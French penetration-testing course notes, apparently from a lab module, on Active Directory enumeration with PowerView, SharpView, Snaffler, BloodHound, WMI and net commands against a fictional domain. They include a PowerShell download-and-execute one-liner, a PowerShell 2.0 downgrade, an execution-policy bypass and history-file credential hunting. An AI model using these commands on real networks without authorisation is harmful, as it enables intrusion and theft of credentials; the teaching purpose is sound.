| --- | --- |
| `Get-NetLocalGroup` | Énumère les groupes locaux sur la machine locale ou une machine distante |
| `Get-NetLocalGroupMember` | Énumère les membres d'un groupe local spécifique |
| `Get-NetShare` | Renvoie les partages ouverts sur la machine locale (ou une machine distante) |
| `Get-NetSession` | Renvoie les informations de session pour la machine locale (ou une machine distante) |
| `Test-AdminAccess` | Teste si l'utilisateur actuel a un accès administratif à la machine locale (ou une machine distante) |

#### Fonctions 'Meta' Threaded :

| Commande | Description |
| --- | --- |
| `Find-DomainUserLocation` | Trouve les machines où des utilisateurs spécifiques sont connectés |
| `Find-DomainShare` | Trouve des partages accessibles sur les machines du domaine |
| `Find-InterestingDomainShareFile` | Recherche des fichiers correspondant à des critères spécifiques sur des partages lisibles dans le domaine |
| `Find-LocalAdminAccess` | Trouve des machines sur le domaine local où l'utilisateur actuel a un accès administrateur local |

#### Fonctions de confiance de domaine :

| Commande | Description |
| --- | --- |
| `Get-DomainTrust` | Renvoie les trusts de domaine pour le domaine actuel ou un domaine spécifié |
| `Get-ForestTrust` | Renvoie tous les trusts de forêt pour la forêt actuelle ou une forêt spécifiée |
| `Get-DomainForeignUser` | Énumère les utilisateurs qui sont dans des groupes en dehors du domaine de l'utilisateur |
| `Get-DomainForeignGroupMember` | Énumère les groupes avec des utilisateurs en dehors du domaine du groupe et renvoie chaque membre étranger |
| `Get-DomainTrustMapping` | Énumère tous les trusts pour le domaine actuel et tous les autres vus |

### Domain User Information

```powershell
PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

name                 : Matthew Morgan
samaccountname       : mmorgan
description          :
memberof             : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                       Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
whencreated          : 10/27/2021 5:37:06 PM
pwdlastset           : 11/18/2021 10:02:57 AM
lastlogontimestamp   : 2/27/2022 6:34:25 PM
accountexpires       : NEVER
admincount           : 1
userprincipalname    : mmorgan@inlanefreight.local
serviceprincipalname :
mail                 :
useraccountcontrol   : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```
### Recursive Group Membership

```powershell
PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : svc_qualys
MemberDistinguishedName : CN=svc_qualys,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-5613

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : sp-admin
MemberDistinguishedName : CN=Sharepoint Admin,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-5228

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Secadmins
GroupDistinguishedName  : CN=Secadmins,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : spong1990
MemberDistinguishedName : CN=Maggie
                          Jablonski,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-1965

<SNIP>  
```

### Trust Enumeration

```powershell
PS C:\htb> Get-DomainTrustMapping

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM

SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL
TargetName      : INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM 
```
### Testing for Local Admin Access

```powershell
PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01

ComputerName    IsAdmin
------------    -------
ACADEMY-EA-MS01    True 
```

### Finding Users With SPN Set

```powershell
PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

serviceprincipalname                          samaccountname
--------------------                          --------------
adfsconnect/azure01.inlanefreight.local       adfs
backupjob/veam001.inlanefreight.local         backupagent
d0wngrade/kerberoast.inlanefreight.local      d0wngrade
kadmin/changepw                               krbtgt
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 sqldev
MSSQLSvc/SPSJDB.inlanefreight.local:1433      sqlprod
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351 sqlqa
sts/inlanefreight.local                       solarwindsmonitor
testspn/kerberoast.inlanefreight.local        testspn
testspn2/kerberoast.inlanefreight.local       testspn2

```
### SharpView

**PowerView** fait partie de la suite offensive PowerShell **PowerSploit**, désormais obsolète. Cependant, l'outil a été mis à jour par **BC-Security** dans le cadre de leur framework **Empire 4**. Empire 4 est un fork du projet Empire original, maintenu activement depuis avril 2022. Nous utilisons la version en développement de PowerView dans ce module, car c'est un excellent outil pour effectuer des reconnaissances dans un environnement Active Directory. Malgré l'arrêt de la maintenance de la version originale, PowerView reste extrêmement puissant et utile dans les réseaux AD modernes.

La version de PowerView maintenue par BC-Security propose de nouvelles fonctionnalités, comme **Get-NetGmsa**, qui permet de rechercher des comptes de service gérés par groupe (Group Managed Service Accounts). Cependant, cette fonctionnalité est hors du cadre de ce module. Il est intéressant de comparer les différences subtiles entre les anciennes et les nouvelles versions pour mieux comprendre leurs capacités respectives.

Un autre outil à expérimenter est **SharpView**, un portage .NET de PowerView. De nombreuses fonctions disponibles dans PowerView peuvent également être utilisées avec SharpView. En ajoutant l'option `-Help` à une méthode, nous pouvons afficher la liste des arguments possibles.

## Énumération avec authentification depuis Windows

Exemple d'utilisation de SharpView pour obtenir de l'aide sur une commande spécifique :

Cela affiche la liste des arguments possibles pour la méthode Get-DomainUser :

```powershell
PS C:\htb> .\SharpView.exe Get-DomainUser -Help

Get_DomainUser -Identity <String[]> -DistinguishedName <String[]> -SamAccountName <String[]> -Name <String[]> 
-MemberDistinguishedName <String[]> -MemberName <String[]> -SPN <Boolean> -AdminCount <Boolean> 
-AllowDelegation <Boolean> -DisallowDelegation <Boolean> -TrustedToAuth <Boolean> -PreauthNotRequired <Boolean> 
-KerberosPreauthNotRequired <Boolean> -NoPreauth <Boolean> -Domain <String> -LDAPFilter <String> -Filter <String> 
-Properties <String[]> -SearchBase <String> -ADSPath <String> -Server <String> -DomainController <String> 
-SearchScope <SearchScope> -ResultPageSize <Int32> -ServerTimeLimit <Nullable`1> -SecurityMasks <Nullable`1> 
-Tombstone <Boolean> -FindOne <Boolean> -ReturnOne <Boolean> -Credential <NetworkCredential> -Raw <Boolean> 
-UACFilter <UACEnum>

```

Nous pouvons utiliser SharpView pour récupérer des informations sur un utilisateur spécifique, par exemple forend, que nous contrôlons :

```powershell
PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend

[Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
[Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=forend)))
objectsid                      : {S-1-5-21-3842939050-3880317879-2865463114-5614}
samaccounttype                 : USER_OBJECT
objectguid                     : 53264142-082a-4cb8-8714-8158b4974f3b
useraccountcontrol             : NORMAL_ACCOUNT
accountexpires                 : 12/31/1600 4:00:00 PM
lastlogon                      : 4/18/2022 1:01:21 PM
lastlogontimestamp             : 4/9/2022 1:33:21 PM
pwdlastset                     : 2/28/2022 12:03:45 PM
lastlogoff                     : 12/31/1600 4:00:00 PM
badPasswordTime                : 4/5/2022 7:09:07 AM
name                           : forend
distinguishedname              : CN=forend,OU=IT Admins,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
whencreated                    : 2/28/2022 8:03:45 PM
whenchanged                    : 4/9/2022 8:33:21 PM
samaccountname                 : forend
memberof                       : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, 
                                  CN=Shared Calendar Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, 
                                  CN=Printer Access,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, 
                                  CN=File Share H Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, 
                                  CN=File Share G Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL}
cn                             : {forend}
objectclass                    : {top, person, organizationalPerson, user}
badpwdcount                    : 0
countrycode                    : 0
usnchanged                     : 3259288
logoncount                     : 26618
primarygroupid                 : 513
objectcategory                 : CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
dscorepropagationdata          : {3/24/2022 3:58:07 PM, 3/24/2022 3:57:44 PM, 3/24/2022 3:52:58 PM, 
                                  3/24/2022 3:49:31 PM, 7/14/1601 10:36:49 PM}
usncreated                     : 3054181
instancetype                   : 4
codepage                       : 0
```

### Snaffler

Snaffler est un outil qui peut nous aider à acquérir des informations d'identification ou d'autres données sensibles dans un environnement Active Directory. Il fonctionne en obtenant une liste des hôtes du domaine, puis en énumérant les partages et les répertoires accessibles en lecture sur ces hôtes. Une fois cette étape réalisée, il parcourt les répertoires accessibles par notre utilisateur et recherche des fichiers pouvant améliorer notre position dans l'évaluation. Snaffler doit être exécuté depuis un hôte joint au domaine ou dans un contexte d'utilisateur du domaine.

#### Exécution de Snaffler

Pour exécuter Snaffler, utilisez la commande suivante :

```bash
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

#### Options de Snaffler

- **`-s`** : Affiche les résultats dans la console.
- **`-d`** : Spécifie le domaine à analyser.
- **`-o`** : Permet d’écrire les résultats dans un fichier journal.
- **`-v`** : Définit le niveau de verbosité. La valeur `data` est généralement idéale, car elle affiche uniquement les résultats, ce qui facilite l'analyse des exécutions de l'outil.

#### Recommandations

Snaffler peut générer une quantité considérable de données. Il est donc conseillé de :

1. Exporter les résultats dans un fichier à l'aide de l'option `-o`.
2. Laisser l'outil s'exécuter complètement avant d'analyser les données.
3. Fournir les sorties brutes de Snaffler aux clients lors d'un test d'intrusion. Ces données peuvent les aider à identifier rapidement les partages à haute valeur qui nécessitent une sécurisation prioritaire.

### BloodHound

#### Vue d'ensemble

BloodHound est un outil open-source conçu pour identifier les chemins d'attaque dans un environnement Active Directory (AD) en analysant les relations entre les objets. Les testeurs d'intrusion et les équipes de sécurité (blue team) peuvent utiliser BloodHound pour visualiser et comprendre ces relations. Grâce à des requêtes Cipher personnalisées, BloodHound peut révéler des failles critiques qui auraient pu passer inaperçues pendant des années.

#### Configuration initiale

Pour utiliser BloodHound efficacement :
1. Authentifiez-vous en tant qu'utilisateur du domaine depuis un hôte d'attaque Windows situé dans le réseau (pas nécessairement joint au domaine).
2. Alternativement, transférez l'outil sur un hôte joint au domaine en utilisant des méthodes telles que :
   - Serveur HTTP Python
   - `smbserver.py` d'Impacket
3. Dans cet exemple, nous utilisons `SharpHound.exe` sur l'hôte d'attaque.

#### Utilisation de SharpHound

Exécutez l'option `--help` pour afficher les paramètres disponibles :

```bash
PS C:\htb> .\SharpHound.exe --help
```

#### Options clés :
- **`-c, --collectionmethods`** : Spécifie les méthodes de collecte de données. Options disponibles : `Container`, `Group`, `Session`, `LoggedOn`, `ACL`, `Trusts`, `Default`, etc.
- **`-d, --domain`** : Spécifie le domaine à analyser.
- **`-s, --searchforest`** : Recherche dans tous les domaines de la forêt (par défaut : `false`).
- **`--stealth`** : Active la collecte furtive, privilégiant `DCOnly` autant que possible.
- **`--zipfilename`** : Spécifie le nom du fichier ZIP de sortie.

#### Commande Exemple :
```bash
PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT
```

#### Résultats :
- SharpHound collecte les données et génère un fichier ZIP contenant des fichiers JSON pour l'analyse.
- Exfiltrez le fichier ZIP vers votre machine virtuelle ou importez-le dans l'interface graphique de BloodHound.

#### Utilisation de l'interface graphique de BloodHound

1. Ouvrez BloodHound sur l'hôte d'attaque ou la machine virtuelle :
   ```bash
   PS C:\htb> bloodhound
   ```
2. Connectez-vous avec les identifiants par défaut (`neo4j: HTB_@cademy_stdnt!`) si demandé.
3. Téléchargez le fichier ZIP via le bouton **Upload Data**.
4. Explorez les données téléchargées en recherchant le domaine (par exemple, `domain:INLANEFREIGHT.LOCAL`).

### Requêtes préconstruites

BloodHound inclut des requêtes préconstruites pour analyser le domaine. Par exemple :

#### **Trouver des ordinateurs avec des systèmes d'exploitation non pris en charge**
- Identifie les hôtes exécutant des systèmes d'exploitation obsolètes et non pris en charge.
- Résultats possibles :
  - **Windows 7**
  - **Windows Server 2008**
- Ces systèmes sont courants dans les réseaux d'entreprise en raison de dépendances à des logiciels anciens.

#### Recommandations :
1. Segmentez les systèmes obsolètes du reste du réseau.
2. Élaborez un plan pour remplacer ou décommissionner ces systèmes.
3. Validez si les hôtes sont "actifs" ou des enregistrements inactifs dans AD avant de rédiger un rapport.

### Rapport
- Documentez les découvertes comme suit :
  - **Failles à haut risque** : Pour les systèmes d'exploitation non pris en charge.
  - **Recommandations de bonnes pratiques** : Pour nettoyer les anciens enregistrements dans AD.

BloodHound fournit des informations précieuses pour sécuriser les environnements AD, identifier les vulnérabilités et aider les organisations à renforcer leurs réseaux.


## Living Off the Land

### Commandes de Base pour l'Énumération

| Commande | Résultat |
|----------|----------|
| `hostname` | Affiche le nom du PC |
| `[System.Environment]::OSVersion.Version` | Affiche la version et le niveau de révision du système d'exploitation |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Affiche les correctifs et les mises à jour appliqués à l'hôte |
| `ipconfig /all` | Affiche l'état et les configurations des adaptateurs réseau |
| `set` | Affiche une liste des variables d'environnement pour la session en cours (exécuté depuis l'invite de commande) |
| `echo %USERDOMAIN%` | Affiche le nom de domaine auquel appartient l'hôte (exécuté depuis l'invite de commande) |
| `echo %logonserver%` | Affiche le nom du contrôleur de domaine avec lequel l'hôte se connecte (exécuté depuis l'invite de commande) |


### Exploiter PowerShell

PowerShell existe depuis 2006 et offre aux administrateurs système Windows un cadre étendu pour administrer tous les aspects des systèmes Windows et des environnements AD. C'est un langage de script puissant qui peut être utilisé pour explorer en profondeur les systèmes. PowerShell dispose de nombreuses fonctions et modules intégrés que nous pouvons utiliser lors d'une mission pour explorer l'hôte et le réseau, ainsi que pour envoyer et recevoir des fichiers.

Voici quelques-unes des façons dont PowerShell peut nous aider.

| Cmd-Let | Description |
|---------|-------------|
| `Get-Module` | Liste les modules disponibles chargés pour utilisation. |
| `Get-ExecutionPolicy -List` | Affiche les paramètres de la politique d'exécution pour chaque portée sur un hôte. |
| `Set-ExecutionPolicy Bypass -Scope Process` | Cela changera la politique pour notre processus actuel en utilisant le paramètre -Scope. Cela rétablira la politique une fois que nous quitterons le processus ou le terminerons. C'est idéal car nous ne ferons pas de changement permanent sur l'hôte victime. |
| `Get-ChildItem Env: I ft Key,Value` | Retourne les valeurs d'environnement telles que les chemins clés, les utilisateurs, les informations sur l'ordinateur, etc. |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Avec cette commande, nous pouvons obtenir l'historique PowerShell de l'utilisateur spécifié. Cela peut être très utile car l'historique des commandes peut contenir des mots de passe ou nous orienter vers des fichiers de configuration ou des scripts contenant des mots de passe. |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL pour télécharger le fichier'); <commandes suivantes>"` | C'est un moyen rapide et facile de télécharger un fichier depuis le web en utilisant PowerShell et de l'appeler depuis la mémoire. |

### Downgrade Powershell

```powershell
PS C:\htb> Get-host

Name             : ConsoleHost
Version          : 5.1.19041.1320
InstanceId       : 18ee9fb4-ac42-4dfe-85b2-61687291bbfc
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
DebuggerEnabled  : True
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> powershell.exe -version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\htb> Get-host
Name             : ConsoleHost
Version          : 2.0
InstanceId       : 121b807c-6daa-4691-85ef-998ac137e469
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> get-module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Script     0.0        chocolateyProfile                   {TabExpansion, Update-SessionEnvironment, refreshenv}
Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Content...}
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     0.7.3.1    posh-git                            {Add-PoshGitToProfile, Add-SshKey, Enable-GitColors, Expand-GitCommand...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PSReadLineKeyHandler...
```

### Firewall Checks

```powershell
PS C:\htb> netsh advfirewall show allprofiles

Domain Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Private Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Public Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096
```

### Windows Defender Check (from CMD.exe) 

```powershell
C:\htb> sc query windefend

SERVICE_NAME: windefend
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

### Get-MpComputerStatus

```powershell
PS C:\htb> Get-MpComputerStatus

AMEngineVersion                  : 1.1.19000.8
AMProductVersion                 : 4.18.2202.4
AMRunningMode                    : Normal
AMServiceEnabled                 : True
AMServiceVersion                 : 4.18.2202.4
AntispywareEnabled               : True
AntispywareSignatureAge          : 0
AntispywareSignatureLastUpdated  : 3/21/2022 4:06:15 AM
AntispywareSignatureVersion      : 1.361.414.0
AntivirusEnabled                 : True
AntivirusSignatureAge            : 0
AntivirusSignatureLastUpdated    : 3/21/2022 4:06:16 AM
AntivirusSignatureVersion        : 1.361.414.0
BehaviorMonitorEnabled           : True
ComputerID                       : FDA97E38-1666-4534-98D4-943A9A871482
ComputerState                    : 0
DefenderSignaturesOutOfDate      : False
DeviceControlDefaultEnforcement  : Unknown
DeviceControlPoliciesLastUpdated : 3/20/2022 9:08:34 PM
DeviceControlState               : Disabled
FullScanAge                      : 4294967295
FullScanEndTime                  :
FullScanOverdue                  : False
FullScanRequired                 : False
FullScanSignatureVersion         :
FullScanStartTime                :
IoavProtectionEnabled            : True
IsTamperProtected                : True
IsVirtualMachine                 : False
LastFullScanSource               : 0
LastQuickScanSource              : 2

<SNIP>
```

### Informations Réseau

#### Commandes Réseau

| Commande | Description |
|----------|-------------|
| `arp -a` | Liste tous les hôtes connus stockés dans la table arp. |
| `ipconfig /all` | Affiche les paramètres des adaptateurs pour l'hôte. Nous pouvons déterminer le segment de réseau à partir de là. |
| `route print` | Affiche la table de routage (IPv4 & IPv6) identifiant les réseaux connus et les routes de couche trois partagées avec l'hôte. |
| `netsh advfirewall show allprofiles` | Affiche l'état du pare-feu de l'hôte. Nous pouvons déterminer s'il est actif et s'il filtre le trafic. |

Des commandes telles que `ipconfig /all` et `systeminfo` nous montrent quelques configurations réseau de base. Deux autres commandes importantes nous fournissent une tonne de données précieuses et pourraient nous aider à approfondir notre accès. `arp -a` et `route print` nous montreront quels hôtes la machine sur laquelle nous sommes est au courant et quels réseaux sont connus de l'hôte. Tous les réseaux qui apparaissent dans la table de routage sont des avenues potentielles pour un mouvement latéral car ils sont suffisamment accessibles pour qu'une route ait été ajoutée, ou ils ont été administrativement définis là pour que l'hôte sache comment accéder aux ressources sur le domaine. Ces deux commandes peuvent être particulièrement utiles dans la phase de découverte d'une évaluation en boîte noire où nous devons limiter notre balayage.


```powershell
PS C:\htb> route print

===========================================================================
Interface List
  8...00 50 56 b9 9d d9 ......vmxnet3 Ethernet Adapter #2
 12...00 50 56 b9 de 92 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       172.16.5.1      172.16.5.25    261
          0.0.0.0          0.0.0.0       10.129.0.1   10.129.201.234     20
       10.129.0.0      255.255.0.0         On-link    10.129.201.234    266
   10.129.201.234  255.255.255.255         On-link    10.129.201.234    266
   10.129.255.255  255.255.255.255         On-link    10.129.201.234    266
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
       172.16.4.0    255.255.254.0         On-link       172.16.5.25    261
      172.16.5.25  255.255.255.255         On-link       172.16.5.25    261
     172.16.5.255  255.255.255.255         On-link       172.16.5.25    261
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link    10.129.201.234    266
        224.0.0.0        240.0.0.0         On-link       172.16.5.25    261
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link    10.129.201.234    266
  255.255.255.255  255.255.255.255         On-link       172.16.5.25    261
  ===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0       172.16.5.1  Default
===========================================================================

IPv6 Route Table
===========================================================================
```

L’utilisation des commandes arp -a et route print ne bénéficiera pas seulement à l’énumération des environnements AD, mais nous aidera également à identifier les opportunités de pivot vers différents segments de réseau dans n’importe quel environnement. Ce sont des commandes que nous devrions envisager d’utiliser à chaque engagement pour aider nos clients à comprendre où un attaquant pourrait tenter d’aller après une compromission initiale.


### Windows Management Instrumentation (WMI)

Windows Management Instrumentation (WMI) est un moteur de script largement utilisé dans les environnements d'entreprise Windows pour récupérer des informations et exécuter des tâches administratives sur des hôtes locaux et distants. Pour notre utilisation, nous allons créer un rapport WMI sur les utilisateurs de domaine, les groupes, les processus et d'autres informations de notre hôte et d'autres hôtes de domaine.

#### Vérifications rapides WMI

| Commande | Description |
|----------|-------------|
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Affiche le niveau de correctif et la description des correctifs appliqués |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Affiche les informations de base de l'hôte, y compris les attributs de la liste |
| `wmic process list /format:list` | Liste de tous les processus sur l'hôte |
| `wmic ntdomain list /format:list` | Affiche des informations sur le domaine et les contrôleurs de domaine |
| `wmic useraccount list /format:list` | Affiche des informations sur tous les comptes locaux et tous les comptes de domaine qui se sont connectés à l'appareil |
| `wmic group list /format:list` | Informations sur tous les groupes locaux |
| `wmic sysaccount list /format:list` | Affiche des informations sur tous les comptes système utilisés comme comptes de service |


```powershell
C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

Caption          Description      DnsForestName           DomainControllerAddress  DomainName
ACADEMY-EA-MS01  ACADEMY-EA-MS01
INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\172.16.5.5             INLANEFREIGHT
LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\172.16.5.240           LOGISTICS
FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\172.16.5.238           FREIGHTLOGISTIC
```

### Commandes Net

Les commandes Net peuvent être bénéfiques lorsque nous tentons d'énumérer des informations à partir du domaine. Ces commandes peuvent être utilisées pour interroger l'hôte local et les hôtes distants, de la même manière que les capacités fournies par WMI. Nous pouvons lister des informations telles que :

- Utilisateurs locaux et de domaine
- Groupes
- Hôtes
- Utilisateurs spécifiques dans les groupes
- Contrôleurs de domaine
- Exigences de mot de passe

Nous couvrirons quelques exemples ci-dessous. Gardez à l'esprit que les commandes net.exe sont généralement surveillées par les solutions EDR et peuvent rapidement révéler notre emplacement si notre évaluation comporte une composante d'évasion. Certaines organisations configureront même leurs outils de surveillance pour déclencher des alertes si certaines commandes sont exécutées par des utilisateurs dans des UO spécifiques, comme le compte d'un associé marketing exécutant des commandes telles que whoami et net localgroup administrators, etc. Cela pourrait être un signal d'alarme évident pour quiconque surveille fortement le réseau.

#### Tableau des Commandes Net Utiles

| Commande | Description |
|----------|-------------|
| `net accounts` | Informations sur les exigences de mot de passe |
| `net accounts /domain` | Politique de mot de passe et de verrouillage |
| `net group /domain` | Informations sur les groupes de domaine |
| `net group "Domain Admins" /domain` | Liste des utilisateurs avec des privilèges d'administrateur de domaine |
| `net group "domain computers" /domain` | Liste des PC connectés au domaine |
| `net group "Domain Controllers" /domain` | Liste des comptes PC des contrôleurs de domaine |
| `net group <domain_group_name> /domain` | Utilisateur appartenant au groupe |
| `net groups /domain` | Liste des groupes de domaine |
| `net localgroup` | Tous les groupes disponibles |
| `net localgroup administrators /domain` | Liste des utilisateurs appartenant au groupe des administrateurs dans le domaine (le groupe Domain Admins est inclus ici par défaut) |
| `net localgroup Administrators` | Informations sur un groupe (administrateurs) |
| `net localgroup administrators [username] /add` | Ajouter un utilisateur aux administrateurs |
| `net share` | Vérifier les partages actuels |
| `net user <ACCOUNT_NAME> /domain` | Obtenir des informations sur un utilisateur dans le domaine |
| `net user /domain` | Lister tous les utilisateurs du domaine |
| `net user %username%` | Informations sur l'utilisateur actuel |
| `net use x: \\computer\share` | Monter le partage localement |
| `net view` | Obtenir une liste des ordinateurs |
| `net view /all /domain[:domainname]` | Partages sur les domaines |
| `net view \\computer /ALL` | Lister les partages d'un ordinateur |
| `net view /domain` | Liste des PC du domaine |

#### Liste des Groupes de Domaine

```powershell
PS C:\htb> net group /domain

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

Group Accounts for \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
-------------------------------------------------------------------------------
*$H25000-1RTRKC5S507F
*Accounting
*Barracuda_all_access
*Barracuda_facebook_access
*Barracuda_parked_sites
*Barracuda_youtube_exempt
*Billing
*Billing_users
*Calendar Access
*CEO
*CFO
*Cloneable Domain Controllers
*Collaboration_users
*Communications_users
*Compliance Management
*Computer Group Management
*Contractors
*CTO

<SNIP>
```

#### Informations sur un Utilisateur de Domaine

```powershell
PS C:\htb> net user /domain wrouse

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

User name                    wrouse
Full Name                    Christopher Davis
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/27/2021 10:38:01 AM
Password expires             Never
Password changeable          10/28/2021 10:38:01 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
